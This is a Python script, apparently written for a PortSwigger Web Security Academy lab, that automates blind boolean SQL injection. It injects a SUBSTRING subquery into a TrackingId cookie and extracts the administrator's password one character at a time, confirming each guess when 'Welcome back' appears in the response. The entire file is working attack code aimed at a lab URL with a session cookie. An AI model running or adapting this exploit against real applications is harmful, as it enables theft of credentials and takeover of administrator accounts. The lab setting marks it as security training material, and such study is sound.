import aiohttp
import asyncio
import string
from urllib.parse import quote

# === НАСТРОЙКИ ===
URL = "https://0ad60029041633f28094fe770047008a.web-security-academy.net/filter?category=Gifts/"
COOKIE_TEMPLATE = "TrackingId=nrvmhlA02nBQ0ADX{INJECT}; session=UhvPvN4a2Zsexs2sN89MblVNFEVLnwh8"
CHARS = string.ascii_lowercase + string.digits
PASSWORD_LENGTH = 20
KEYWORD = "Welcome back"
MAX_CONCURRENT = 5  # количество параллельных запросов

# === SQLi payload ===
def build_payload(pos, ch):
    payload = f"' AND (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator')='{ch}"
    return quote(payload)

# === Проверка одного символа ===
async def try_char(session, pos, ch):
    inject = build_payload(pos, ch)
    cookie_value = COOKIE_TEMPLATE.replace("{INJECT}", inject)
    headers = {"Cookie": cookie_value}
    async with session.get(URL, headers=headers) as resp:
        text = await resp.text()
        if KEYWORD.lower() in text.lower():
            return ch
    return None

# === Основной цикл ===
async def main():
    password = ""
    print(f"[INFO] Start brute force for {PASSWORD_LENGTH} characters...")

    async with aiohttp.ClientSession() as session:
        for pos in range(1, PASSWORD_LENGTH + 1):
            found_char = None
            # создаём задачи на все символы позиции
            tasks = [try_char(session, pos, ch) for ch in CHARS]

            for i in range(0, len(tasks), MAX_CONCURRENT):
                batch = tasks[i:i+MAX_CONCURRENT]
                results = await asyncio.gather(*batch)
                for result in results:
                    if result:
                        found_char = result
                        password += found_char
                        print(f"[FOUND] Position {pos} -> {found_char}")
                        break
                if found_char:
                    break

            if not found_char:
                print(f"[INFO] No matching character found at position {pos}")
                password += "?"

    print(f"[DONE] Password guessed: {password}")

# === Запуск ===
if __name__ == "__main__":
    asyncio.run(main())

